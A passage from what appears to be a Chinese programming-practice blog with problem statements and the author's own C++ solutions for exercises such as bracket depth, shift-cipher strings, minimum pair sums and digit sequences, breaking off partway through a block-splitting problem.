<h2 id="输入描述-10"><a href="#输入描述-10" class="headerlink" title="输入描述"></a>输入描述</h2><p>一个只包括<code>&#39;(&#39;,&#39;)&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;[&#39;,&#39;]&#39;</code>的字符串</p>
<h2 id="输出描述-10"><a href="#输出描述-10" class="headerlink" title="输出描述"></a>输出描述</h2><p>一个整数 ，最大的括号深度</p>
<h2 id="示例一-5"><a href="#示例一-5" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[]</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="说明-2"><a href="#说明-2" class="headerlink" title="说明"></a>说明</h3><p>有效字符串最大嵌套深度为1</p>
<h2 id="示例二-2"><a href="#示例二-2" class="headerlink" title="示例二"></a>示例二</h2><h3 id="输入-12"><a href="#输入-12" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">([]&#123;()&#125;)</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="输出-12"><a href="#输出-12" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h2 id="个人代码-2"><a href="#个人代码-2" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">一字符串仅由三种（6个）括号组成，</span><br><span class="line">求嵌套深度，若不合法，输出0</span><br><span class="line">*/</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void solution(string s)</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;char&gt; t;</span><br><span class="line">    int depth=0;</span><br><span class="line">   //3.为了防止&#125;[]()这种情况，所以必须先入首字符</span><br><span class="line">    if(s[0]!=&#x27;(&#x27;&amp;&amp;s[0]!=&#x27;[&#x27;&amp;&amp;(s[0]!=&#x27;&#123;&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;0;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if((s[i]==&#x27;(&#x27;)||(s[i]==&#x27;[&#x27;)||(s[i]==&#x27;&#123;&#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">            t.push_back(s[i]);</span><br><span class="line">            //depth=max(depth,t.size()); //报错？</span><br><span class="line">            if(depth&lt;t.size())</span><br><span class="line">            depth=t.size();</span><br><span class="line">        &#125;</span><br><span class="line">        if(i&gt;0)</span><br><span class="line">        &#123;</span><br><span class="line">            if(s[i]==&#x27;)&#x27;&amp;&amp;t[t.size()-1]==&#x27;(&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">              t.pop_back();//1.哦，pop了之后，t的size改变了，进而索引变了,所以不能t[i-1]</span><br><span class="line">             // depth=t.size();</span><br><span class="line">            &#125;   </span><br><span class="line">            if(s[i]==&#x27;]&#x27;&amp;&amp;t[t.size()-1]==&#x27;[&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                t.pop_back();</span><br><span class="line">            //  depth++;</span><br><span class="line">            &#125;</span><br><span class="line">            if(s[i]==&#x27;&#125;&#x27;&amp;&amp;t[t.size()-1]==&#x27;&#123;&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                t.pop_back();</span><br><span class="line">             // depth++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    //2.求最大嵌套深度，不是有效括号个数，那就是t存储个数</span><br><span class="line">    if(t.size()!=0) cout&lt;&lt;0;</span><br><span class="line">    else cout&lt;&lt;depth;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    solution(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="思想-4"><a href="#思想-4" class="headerlink" title="思想"></a>思想</h2><p>栈的利用，括号匹配</p>
<h1 id="13-字符串加密"><a href="#13-字符串加密" class="headerlink" title="13.字符串加密"></a>13.字符串加密</h1><p>给你一串未加密的字符串<code>str</code>，<br>通过对字符串的每一个字母进行改变来实现加密，<br>加密方式是在每一个字母<code>str[i]</code>偏移特定数组元素<code>a[i]</code>的量，<br>数组<code>a</code>前三位已经赋值：<code>a[0]=1</code>,<code>a[1]=2</code>,<code>a[2]=4</code>。<br>当<code>i&gt;=3</code>时，数组元素<code>a[i]=a[i-1]+a[i-2]+a[i-3]</code>，<br>例如：原文 <code>abcde</code> 加密后 <code>bdgkr</code>，其中偏移量分别是<code>1</code>,<code>2</code>,<code>4</code>,<code>7</code>,<code>13</code>。</p>
<h2 id="输入描述-11"><a href="#输入描述-11" class="headerlink" title="输入描述"></a>输入描述</h2><p>第一行为一个整数<code>n</code>（<code>1 &lt;= n &lt;= 1000</code>），<br>表示有<code>n</code>组测试数据，每组数据包含一行，<br>原文<code>str</code>（只含有小写字母， <code>0 &lt; 长度 &lt;= 50</code>）。</p>
<h2 id="输出描述-11"><a href="#输出描述-11" class="headerlink" title="输出描述"></a>输出描述</h2><p>每组测试数据输出一行，表示字符串的密文</p>
<h2 id="示例一-6"><a href="#示例一-6" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-13"><a href="#输入-13" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">xy</span><br></pre></td></tr></table></figure>

<h3 id="输出-13"><a href="#输出-13" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ya</span><br></pre></td></tr></table></figure>

<h2 id="个人代码-3"><a href="#个人代码-3" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void pianyi(vector&lt;int&gt; &amp;a,int n)</span><br><span class="line">&#123;</span><br><span class="line">    a[0]=1;</span><br><span class="line">    a[1]=2;</span><br><span class="line">    a[2]=4;</span><br><span class="line">    for(int i=3;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i]=a[i-1]+a[i-2]+a[i-3];</span><br><span class="line">       // cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void solution(string &amp;s,vector&lt;int&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i]=(s[i]-&#x27;a&#x27;+a[i])%26+&#x27;a&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;s&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // string s;</span><br><span class="line">    // cin&gt;&gt;s;</span><br><span class="line">    // vector&lt;int&gt; a(s.size());</span><br><span class="line">    // pianyi(a,s.size());//算出从0到s.size-1的偏移量</span><br><span class="line">    // solution(s,a);</span><br><span class="line">    int n=0;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    getchar();</span><br><span class="line">    vector&lt;string&gt; s;</span><br><span class="line">    string t;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        getline(cin,t);</span><br><span class="line">         s.push_back(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // for(string list:s)</span><br><span class="line">    // cout&lt;&lt;list&lt;&lt;&quot; &quot;;</span><br><span class="line">    int len=0;</span><br><span class="line">    for(string list:s)</span><br><span class="line">    &#123;</span><br><span class="line">        //len=max(len,list.size());</span><br><span class="line">        if(len&lt;list.size())</span><br><span class="line">            len=list.size();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    vector&lt;int&gt; a(len);</span><br><span class="line">      pianyi(a,len);//算出从0到s.size-1的偏移量</span><br><span class="line">      for(int i=0;i&lt;s.size();i++)</span><br><span class="line">      &#123;</span><br><span class="line">        solution(s[i],a);</span><br><span class="line">      &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可用递归函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function fn(num)&#123;</span><br><span class="line">    if(num==0)&#123;</span><br><span class="line">        return 1</span><br><span class="line">    &#125;</span><br><span class="line">    else  if(num==1)&#123;</span><br><span class="line">        return 2</span><br><span class="line">    &#125; </span><br><span class="line">    else if(num==2)&#123;</span><br><span class="line">        return 4</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return fn(num-1)+fn(num-2)+fn(num-3)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="14-整数对最小和"><a href="#14-整数对最小和" class="headerlink" title="14.整数对最小和"></a>14.整数对最小和</h1><h2 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>给定两个整数数组 <code>array1</code> <code>array2</code>数组元素按升序排列<br>假设从<code>array1</code> <code>array2</code>中分别取出一个元素可构成一对元素<br>现在需要取出<code>K</code>对元素<br>并对取出的所有元素求和<br>计算和的最小值<br>注意：<br>两对元素如果对应于<code>array1</code> <code>array2</code>中的两个下标均相同，则视为同一个元素</p>
</blockquote>
<h2 id="输入描述-12"><a href="#输入描述-12" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入两行数组<code>array1</code> <code>array2</code><br>每行首个数字为数组大小 <code>size</code>( <code>0 &lt; size &lt;= 100</code>)<br><code>0 &lt; array1(i) &lt;= 10000 &lt; array2(i) &lt;= 1000</code><br>接下来一行为正整数<code>k</code> (<code>0 &lt; k &lt;= array1.size() * array2.size()</code>)</p>
<h2 id="输出描述-12"><a href="#输出描述-12" class="headerlink" title="输出描述"></a>输出描述</h2><p>满足要求的最小和</p>
<h2 id="示例一-7"><a href="#示例一-7" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-14"><a href="#输入-14" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 1 1 2</span><br><span class="line">3 1 2 3</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<h3 id="输出-14"><a href="#输出-14" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br></pre></td></tr></table></figure>



<h3 id="说明-3"><a href="#说明-3" class="headerlink" title="说明"></a>说明</h3><p>用例中，需要取两个元素 取第一个数组第<code>0</code>个元素 与第二个数组第<code>0</code>个元素，组成一对元素<code>[1,1]</code><br>取第一个数组第<code>1</code>个元素 与第二个数组第<code>0</code>个元素，组成一对元素<code>[1,1]</code><br>求和为<code>1+1+1+1=4</code> 为满足要求的最小和</p>
<h2 id="个人代码-4"><a href="#个人代码-4" class="headerlink" title="个人代码"></a>个人代码</h2><blockquote>
<p>1.各自排序，我用的快速排序</p>
<p>2.比较最小值相加即可</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">/*</span><br><span class="line">3 1 1 2</span><br><span class="line">3 1 2 3</span><br><span class="line">2</span><br><span class="line">*/</span><br><span class="line">int part(vector&lt;int&gt; &amp;a,int low,int high);</span><br><span class="line">void quicksort(vector&lt;int&gt; &amp;a,int low,int high);</span><br><span class="line"></span><br><span class="line">int part(vector&lt;int&gt; &amp;a,int low,int high)</span><br><span class="line">&#123;</span><br><span class="line">    int i=low,j=high,privot=a[low];//基准</span><br><span class="line">    while(i&lt;j)</span><br><span class="line">    &#123;</span><br><span class="line">        while(i&lt;j&amp;&amp;a[j]&gt;privot)//右边找一个小于privot的值</span><br><span class="line">        &#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        if(i&lt;j)</span><br><span class="line">        &#123;</span><br><span class="line">            swap(a[i++],a[j]);//交换完，i右移</span><br><span class="line">        &#125;</span><br><span class="line">        while(i&lt;j&amp;&amp;a[i]&lt;=privot)//左边找一个大于privot的值</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        if(i&lt;j)</span><br><span class="line">        &#123;</span><br><span class="line">            swap(a[i],a[j--]);//交换完,j左移</span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line">void quicksort(vector&lt;int&gt; &amp;a,int low,int high)</span><br><span class="line">&#123;</span><br><span class="line">    int mid;</span><br><span class="line">    if(low&lt;high)</span><br><span class="line">    &#123;</span><br><span class="line">        mid=part(a,low,high);//基准值</span><br><span class="line">        quicksort(a,low,mid-1);</span><br><span class="line">        quicksort(a,mid+1,high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //a[0]取i个，则a[1]取k-i个；</span><br><span class="line">    //从a[0]求i个最小值和，从a[1]求k-i个最小值和</span><br><span class="line"> </span><br><span class="line">    //排序，各自求最小值。双指针</span><br><span class="line">    vector&lt;int&gt; a[2];</span><br><span class="line">    int num;</span><br><span class="line">    for(int i=0;i&lt;2;i++)</span><br><span class="line">    &#123;</span><br><span class="line">       while(cin&gt;&gt;num)</span><br><span class="line">       &#123;</span><br><span class="line">        a[i].push_back(num);</span><br><span class="line">        if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">       &#125;</span><br><span class="line">      // cin.ignore();</span><br><span class="line">    &#125;</span><br><span class="line">    int k;</span><br><span class="line">    cin&gt;&gt;k;//这个是对数，即a[0][i]与a[1][j]所组成的对数</span><br><span class="line"></span><br><span class="line">    // quicksort(a[1],1,a[1][0]);</span><br><span class="line">    // for(int i:a[1])</span><br><span class="line">    // cout&lt;&lt;i&lt;&lt;&quot; &quot;;</span><br><span class="line"></span><br><span class="line">    //从小到大排序过后</span><br><span class="line">    //quicksort(a[0],1,a[0][0]); 为啥不行嘞</span><br><span class="line">    quicksort(a[0],1,a[0].size()-1);</span><br><span class="line">    quicksort(a[1],1,a[1].size()-1);</span><br><span class="line">    int i=1,j=1,co=0,sum=0;</span><br><span class="line">    //取的是整数&quot;对&quot;，最小和，意味着有一方有最小的值，固定下来即可。</span><br><span class="line">    //逮住一个最小的薅，组成整数&quot;对&quot;</span><br><span class="line">    while(i&lt;a[0][0]&amp;&amp;co&lt;k)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a[0][i]&lt;a[0][j])</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=a[0][i++]+a[0][j];</span><br><span class="line">            co++;</span><br><span class="line">        &#125;</span><br><span class="line">        else </span><br><span class="line">        &#123;</span><br><span class="line">            sum+=a[0][i]+a[0][j++];</span><br><span class="line">            co++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h2><p>来自<a href="https://wiki.amoscloud.com/zh/ProgramingPractice/NowCoder/Adecco/Topic0002">题目0002-整数对最小和 | AmosCloud Wiki</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">struct Node &#123;</span><br><span class="line">    int i, j, val;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">bool cmp(Node a, Node b) &#123;</span><br><span class="line">    return a.val &lt; b.val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int m, n, k;</span><br><span class="line">    cin &gt;&gt; m;//a1数组的大小</span><br><span class="line">    vector&lt;int&gt; arr1(m);</span><br><span class="line">    for (int i = 0; i &lt; m; i++) &#123;</span><br><span class="line">        cin &gt;&gt; arr1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    cin &gt;&gt; n;//a2数组的大小</span><br><span class="line">    vector&lt;int&gt; arr2(n);</span><br><span class="line">    for (int i = 0; i &lt; n; i++) &#123;</span><br><span class="line">        cin &gt;&gt; arr2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    cin &gt;&gt; k;//整数对个数</span><br><span class="line"></span><br><span class="line">    vector&lt;Node&gt; nodes(m * n);</span><br><span class="line">    int nodesLen = 0;</span><br><span class="line">    for (int i = 0; i &lt; m; i++) &#123;</span><br><span class="line">        for (int j = 0; j &lt; n; j++) &#123;</span><br><span class="line">            nodes[nodesLen].i = i;</span><br><span class="line">            nodes[nodesLen].j = j;</span><br><span class="line">            nodes[nodesLen].val = arr1[i] + arr2[j];</span><br><span class="line">            nodesLen++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sort(nodes.begin(), nodes.end(), cmp);//从小到大排序</span><br><span class="line"></span><br><span class="line">    int ans = 0;</span><br><span class="line">    vector&lt;bool&gt; used(m, false);</span><br><span class="line">    int cnt = 0;</span><br><span class="line">    for (int i = 0; i &lt; nodesLen; i++) &#123;</span><br><span class="line">        if (used[nodes[i].i]) continue;</span><br><span class="line">        ans += nodes[i].val;</span><br><span class="line">        used[nodes[i].i] = true;</span><br><span class="line">        cnt++;</span><br><span class="line">        if (cnt == k) break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="15-求字符串中所有整数的最小和"><a href="#15-求字符串中所有整数的最小和" class="headerlink" title="15.求字符串中所有整数的最小和"></a>15.求字符串中所有整数的最小和</h1><h2 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>字符串s，只包含 a-z A-Z + - ；<br>合法的整数包括<br>1） 正整数 一个或者多个0-9组成，如 0 2 3 002 102<br>2）负整数 负号 - 开头，数字部分由一个或者多个0-9组成，如 -0 -012 -23 -00023</p>
</blockquote>
<h2 id="输入描述-13"><a href="#输入描述-13" class="headerlink" title="输入描述"></a>输入描述</h2><p>包含数字的字符串</p>
<h2 id="输出描述-13"><a href="#输出描述-13" class="headerlink" title="输出描述"></a>输出描述</h2><p>所有整数的最小和</p>
<h2 id="示例一-8"><a href="#示例一-8" class="headerlink" title="示例一"></a>示例一</h2><p>输入</p>
<blockquote>
<p>bb1234aa</p>
</blockquote>
<p>输出</p>
<blockquote>
<p>10</p>
</blockquote>
<h2 id="个人代码-5"><a href="#个人代码-5" class="headerlink" title="个人代码"></a>个人代码</h2><p>1.正数按个位加，负数按最大值减</p>
<p>2.用了stoi，字符串转化为数字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void solution(string s)</span><br><span class="line">&#123;</span><br><span class="line">    int sum=0,flag=-1;</span><br><span class="line">    string t=&quot;&quot;;</span><br><span class="line">    for(char i:s)</span><br><span class="line">    &#123;</span><br><span class="line">        if(i==&#x27;-&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            flag=1;</span><br><span class="line">            continue;//跳过本次循环</span><br><span class="line">        &#125;</span><br><span class="line">        if(flag&gt;0) //负数处理</span><br><span class="line">        &#123;</span><br><span class="line">            if(i&gt;=&#x27;0&#x27;&amp;&amp;i&lt;=&#x27;9&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                  t+=i;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                 sum-=stoi(t);</span><br><span class="line">                  t=&quot;&quot;;</span><br><span class="line">                  flag=-9;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else//正数处理</span><br><span class="line">        &#123;</span><br><span class="line">            if(i&gt;=&#x27;0&#x27;&amp;&amp;i&lt;=&#x27;9&#x27;)</span><br><span class="line">         &#123;</span><br><span class="line">             sum+=i-&#x27;0&#x27;;</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;sum;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    // cout&lt;&lt;&#x27;a&#x27;-&#x27;0&#x27;&lt;&lt;endl;</span><br><span class="line">    // cout&lt;&lt;&#x27;A&#x27;-&#x27;0&#x27;&lt;&lt;endl;</span><br><span class="line">    // cout&lt;&lt;&#x27;+&#x27;-&#x27;0&#x27;&lt;&lt;endl;</span><br><span class="line">    //所有整数的最小和，1234既可以看做是一个数1234，也可以看做4个数(1,2,3,4)。确保加和最小</span><br><span class="line">    //有减号，则-最大值。</span><br><span class="line">    //全是正整数，则按个位加和</span><br><span class="line">    //有正有减，个位正数加与最小负数相加</span><br><span class="line">    //  string s1=&quot;00123&quot;,s2=&quot;120&quot;;</span><br><span class="line">    //  cout&lt;&lt;stoi(s1);</span><br><span class="line">    solution(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="16-乱序整数序列两数之和绝对值最小"><a href="#16-乱序整数序列两数之和绝对值最小" class="headerlink" title="16.乱序整数序列两数之和绝对值最小"></a>16.乱序整数序列两数之和绝对值最小</h1><h2 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定一个随机的整数数组(可能存在正整数和负整数)<code>nums</code>,<br>请你在该数组中找出两个数，其和的绝对值<code>(|nums[x]+nums[y]|)</code>为最小值<br>并返回这两个数(按从小到大返回)以及绝对值。<br>每种输入只会对应一个答案。但是，数组中同一个元素不能使用两遍。</p>
<h2 id="输入描述-14"><a href="#输入描述-14" class="headerlink" title="输入描述"></a>输入描述</h2><p>一个通过空格空格分割的有序整数序列字符串，最多<code>1000</code>个整数，<br>且整数数值范围是<code>[-65535,65535]</code></p>
<h2 id="输出描述-14"><a href="#输出描述-14" class="headerlink" title="输出描述"></a>输出描述</h2><p>两个数和两数之和绝对值</p>
<h2 id="示例一-9"><a href="#示例一-9" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-15"><a href="#输入-15" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 -3 7 5 11 15</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="输出-15"><a href="#输出-15" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-3 5 2</span><br></pre></td></tr></table></figure>

<h2 id="个人代码-6"><a href="#个人代码-6" class="headerlink" title="个人代码"></a>个人代码</h2><p>双for</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">/*</span><br><span class="line">一个通过空格空格分割的有序整数序列字符串，最多`1000`个整数，</span><br><span class="line">且整数数值范围是`[-65535,65535]`</span><br><span class="line"></span><br><span class="line">其和的绝对值`(|nums[x]+nums[y]|)`为最小值</span><br><span class="line">并返回这两个数(按从小到大返回)以及绝对值。</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">-1 -3 7 5 11 15</span><br><span class="line">-3 5 2</span><br><span class="line">*/</span><br><span class="line">//怎么说，非必要不同号</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    vector&lt;int&gt; s;</span><br><span class="line">    //输入是有序整数</span><br><span class="line">    int num;</span><br><span class="line">    while(cin&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        s.push_back(num);</span><br><span class="line">        if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // for(int i:s)</span><br><span class="line">    // cout&lt;&lt;i&lt;&lt;&quot;,&quot;;</span><br><span class="line">    int min_num=1000,n1=s[0],n2=s[0];</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    for(int j=i+1;j&lt;s.size();j++)</span><br><span class="line">    &#123;</span><br><span class="line">       if(min_num&gt; abs(s[i]+s[j]))</span><br><span class="line">       &#123;</span><br><span class="line">            min_num=abs(s[i]+s[j]);</span><br><span class="line">            n1=s[i];</span><br><span class="line">            n2=s[j];</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;n1&lt;&lt;&quot; &quot;&lt;&lt;n2&lt;&lt;&quot; &quot;&lt;&lt;min_num;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="17-非严格递增连续数字序列"><a href="#17-非严格递增连续数字序列" class="headerlink" title="17.非严格递增连续数字序列"></a>17.非严格递增连续数字序列</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote>
<p>输入一个字符串仅包含大小写字母和数字<br>求字符串中包含的最长的非严格递增连续数字序列长度比如:<br>12234属于非严格递增数字序列</p>
</blockquote>
<h2 id="输入-16"><a href="#输入-16" class="headerlink" title="输入"></a>输入</h2><p>输入一个字符串仅包含大小写字母和数字</p>
<h2 id="输出-16"><a href="#输出-16" class="headerlink" title="输出"></a>输出</h2><p>输出字符串中包含的最长的非严格递增连续数字序列长度</p>
<h2 id="示例一-10"><a href="#示例一-10" class="headerlink" title="示例一"></a>示例一</h2><p>输入</p>
<blockquote>
<p>abc2234019A334bc</p>
</blockquote>
<p>输出</p>
<blockquote>
<p>4</p>
</blockquote>
<h2 id="个人代码-7"><a href="#个人代码-7" class="headerlink" title="个人代码"></a>个人代码</h2><p>当前值与前者比较</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">//非严格递增长度 12234bs36912 长度5</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //一个个遍历咯，</span><br><span class="line">    /*</span><br><span class="line">    是数字，且每次比前值相等或大一点，就co+1</span><br><span class="line">    否则，将最长值len更新,co清零，重新计算</span><br><span class="line">    */</span><br><span class="line">    string t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    char pre=&#x27;0&#x27;;</span><br><span class="line">    int begin=0,co=0,len=0;</span><br><span class="line">     for(int i=0;i&lt;t.size();i++) //令pre存储第一个字符为数值</span><br><span class="line">    &#123;</span><br><span class="line">        if(t[i]&gt;=&#x27;0&#x27;&amp;&amp;t[i]&lt;=&#x27;9&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                pre=t[i];</span><br><span class="line">                begin=i;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(begin&lt;t.size()) co++; //如果存在这样一个pre</span><br><span class="line"></span><br><span class="line">    for(int i=begin+1;i&lt;t.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(t[i]&gt;=&#x27;0&#x27;&amp;&amp;t[i]&lt;=&#x27;9&#x27;)//如果是数字</span><br><span class="line">        &#123;</span><br><span class="line">            if(t[i]&gt;=pre)//如果是非严格递增</span><br><span class="line">            &#123;</span><br><span class="line">                pre=t[i];</span><br><span class="line">                co++;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                len=max(len,co);</span><br><span class="line">                co=1;//置为1</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else//如果不是数字</span><br><span class="line">        &#123;</span><br><span class="line">            len=max(len,co);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="18-分积木"><a href="#18-分积木" class="headerlink" title="*18.分积木"></a>*18.分积木</h1><h2 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
<p>Solo和koko是两兄弟，妈妈给了他们一大堆积木，每块积木上都有自己的重量。现在他们想要将这些积木分成两堆。哥哥Solo负责分配，弟弟koko要求两个人获得<br>的积木总重量“相等”（根据Koko的逻辑），</p>
<p>个数可以不同，不然就会哭，</p>
<p>但koko只会先将两个数转成二进制再进行加法，而且总会忘记进位（每个进位都忘记）。</p>
<p>如当25（11001）加11（1011）时，koko得到的计算结果是18（10010）：<br>11001<br>+01011</p>
</blockquote>
